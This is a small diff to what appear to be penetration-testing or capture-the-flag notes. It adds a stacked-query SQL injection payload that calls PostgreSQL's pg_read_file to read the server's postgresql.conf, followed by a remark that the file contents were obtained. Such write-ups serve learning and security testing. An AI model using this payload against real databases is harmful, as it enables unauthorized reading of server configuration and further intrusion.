@@ -233,3 +233,11 @@ I am able to get SQLi to work through stacked queries
 
 I can get the path of the config file, using this i should be able to get its output
 
+```python
+''; SELECT pg_read_file('/etc/postgresql/15/main/postgresql.conf', 0, 2000);
+```
+
+![](Pasted%20image%2020260907190933.png)
+
+I can get the contents of the file
+
